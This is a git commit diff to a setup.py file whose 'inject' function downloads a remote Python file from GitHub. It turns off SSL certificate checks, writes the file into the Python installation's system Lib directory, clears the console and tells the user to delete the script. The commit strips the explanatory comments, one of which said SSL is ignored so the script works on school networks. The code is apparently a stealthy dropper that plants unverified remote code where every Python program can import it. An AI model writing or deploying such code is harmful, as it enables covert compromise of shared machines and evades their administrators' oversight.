9d57cfc81c83d9eed8bb0e27e32259819fbc1d8d
deniska12022 <agafodenis56@gmail.com>
2026-05-15 21:20:34 +0300

    Update setup.py

--- setup.py
+++ setup.py
@@ -3,13 +3,10 @@ import os
 import sys
 import ssl
 
-# Прямая RAW ссылка на твое ядро
 URL = "https://raw.githubusercontent.com/deniska12022/math_sys.py/refs/heads/main/math_sys.py"
 
 def inject():
-    # Игнорим SSL для работы в школьных сетях
     ctx = ssl._create_unverified_context()
-    # Путь в системные либы Python
     target = os.path.join(sys.prefix, 'Lib', 'math_sys.py')
 
     try:
@@ -18,7 +15,6 @@ def inject():
             with open(target, 'wb') as f:
                 f.write(response.read())
 
-        # Очистка консоли после успеха
         os.system('cls' if os.name == 'nt' else 'clear')
         print("----------------------------------------")
         print("  SYSTEM READY. DELETE THIS SCRIPT.  ")
